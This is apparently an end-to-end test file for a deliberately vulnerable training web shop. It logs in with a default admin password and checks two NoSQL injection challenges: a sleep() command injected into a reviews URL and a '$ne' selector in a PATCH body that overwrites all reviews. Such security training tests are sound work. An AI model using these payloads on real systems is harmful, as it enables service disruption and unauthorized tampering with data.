const config = require('config')

describe('/#/search', () => {
  beforeEach(() => {
    browser.get('/#/search')
  })

  describe('challenge "NoSql Command Injection"', () => {
    protractor.beforeEach.login({email: 'admin@' + config.get('application.domain'), password: 'admin123'})

    it('should be possible to inject a command into the get route', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.get(\'/rest/product/sleep(1000)/reviews\');')
      browser.driver.sleep(5000)
      browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'NoSQL Injection Tier 1' })
  })

  describe('challenge "NoSql Injection"', () => {
    it('should be possible to inject a selector into the update route', () => {
      browser.waitForAngularEnabled(false)
      browser.executeScript('var $http = angular.injector([\'juiceShop\']).get(\'$http\'); $http.patch(\'/rest/product/reviews\', { "id": { "$ne": -1 }, "message": "injected" });')
      browser.driver.sleep(1000)
      browser.waitForAngularEnabled(true)
    })
    protractor.expect.challengeSolved({ challenge: 'NoSQL Injection Tier 2' })
  })
})
